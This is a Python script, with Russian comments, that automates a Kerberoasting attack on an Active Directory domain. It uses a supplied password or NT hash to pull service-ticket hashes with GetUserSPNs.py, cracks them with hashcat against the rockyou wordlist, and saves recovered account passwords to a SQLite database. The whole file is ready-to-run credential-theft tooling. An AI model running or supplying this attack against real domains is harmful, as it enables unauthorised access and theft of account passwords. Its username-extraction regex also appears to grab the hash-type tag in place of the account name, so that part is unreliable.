import os
import argparse
import subprocess
import re
import sqlite3

class Kerberoasting:
    def __init__(self):
        self.dc_ip = None
        self.username = None
        self.credentials = None
        self.domain = None
        self.wordlist = None
        self.db_path = "suzu.db"

    def argument_parser(self):
        parser = argparse.ArgumentParser(description="Автоматизация выполнения атаки Kerberoasting")
        parser.add_argument("ip", type=str, help="IP-адрес контроллера домена")
        parser.add_argument("-u", "--username", type=str, required=True, help="Имя пользователя")
        parser.add_argument("-c", "--credentials", type=str, required=True, help="Пароль или NT-hash")
        parser.add_argument("-d", "--domain", type=str, required=True, help="Домен")
        parser.add_argument("-w", "--wordlist", type=str, default="/usr/share/wordlists/rockyou.txt", help="Путь к файлу со словарем")
        args = parser.parse_args()

        self.dc_ip = args.ip
        self.username = args.username
        self.credentials = args.credentials
        self.domain = args.domain
        self.wordlist = args.wordlist

    def is_nt_hash(self, credential):
        # NT-хэш имеет длину 32 символа и состоит только из шестнадцатеричных цифр (0-9, a-f)
        return bool(re.match(r'^[0-9a-fA-F]{32}$', credential))

    def run_getuserspns(self):
        try:
            # Конструирование команды
            if self.is_nt_hash(self.credentials):
                # Если credentials соответствует формату NT-хэша
                nt_hash = self.credentials
                if not nt_hash.startswith(':'):
                    nt_hash = f":{nt_hash}"
                command = [
                    "GetUserSPNs.py",
                    f"{self.domain}/{self.username}",
                    "-hashes", nt_hash,
                    "-dc-ip", self.dc_ip,
                    "-outputfile", "results/kerberoasting/kerb_hashes.txt"
                ]
            else:
                # Если credentials это пароль
                command = [
                    "GetUserSPNs.py",
                    f"{self.domain}/{self.username}:{self.credentials}",
                    "-dc-ip", self.dc_ip,
                    "-outputfile", "results/kerberoasting/kerb_hashes.txt"
                ]

            # Выполнение команды и захват вывода
            result = subprocess.run(command, capture_output=True, text=True, check=True)

            # Вывод результата команды
            print(result.stdout)
            if result.stderr:
                print(result.stderr)
        except subprocess.CalledProcessError as e:
            print(f"Ошибка выполнения GetUserSPNs.py: {e}")
            print(e.output)

    def create_database(self):
        # Создание базы данных и таблицы, если они не существуют
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS Kerberoasting (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT NOT NULL,
                password TEXT NOT NULL
            )
        ''')
        conn.commit()
        conn.close()

    def run_hashcat(self):
        if not os.path.exists(self.wordlist):
            print(f"Файл словаря {self.wordlist} не существует")
            return

        try:
            # Запуск hashcat для перебора паролей
            hashcat_cmd = [
                "hashcat", "-m", "13100", "-a", "0",
                "results/kerberoasting/kerb_hashes.txt", self.wordlist
            ]
            subprocess.run(hashcat_cmd, check=True)

            # Получение паролей из hashcat
            show_cmd = [
                "hashcat", "-m", "13100",
                "results/kerberoasting/kerb_hashes.txt", "--show"
            ]
            result = subprocess.run(show_cmd, capture_output=True, text=True, check=True)

            # Обработка результатов и сохранение в базу данных
            self.save_cracked_hashes(result.stdout)

        except subprocess.CalledProcessError as e:
            print(f"Ошибка выполнения hashcat: {e}")
            print(e.output)

    def save_cracked_hashes(self, output):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        for line in output.splitlines():
            parts = line.split(':')
            if len(parts) >= 2:
                hash_info = parts[0]
                password = parts[1]
                username = self.extract_username_from_hash(hash_info)

                cursor.execute('''
                    INSERT INTO Kerberoasting (username, password)
                    VALUES (?, ?)
                ''', (username, password))

        conn.commit()
        conn.close()

    def extract_username_from_hash(self, hash_info):
        # Извлечение имени пользователя из хэша
        match = re.search(r'\$([^$]+)\$', hash_info)
        return match.group(1) if match else "unknown"

def main():
    kerberoasting = Kerberoasting()

    # Чтение аргументов командной строки
    kerberoasting.argument_parser()

    # Создание папки с результатами
    os.makedirs('results/kerberoasting', exist_ok=True)

    # Создание базы данных и таблицы
    kerberoasting.create_database()

    # Запуск GetUserSPNs.py с предоставленными аргументами
    kerberoasting.run_getuserspns()

    # Запуск hashcat для перебора паролей
    kerberoasting.run_hashcat()

if __name__ == "__main__":
    main()
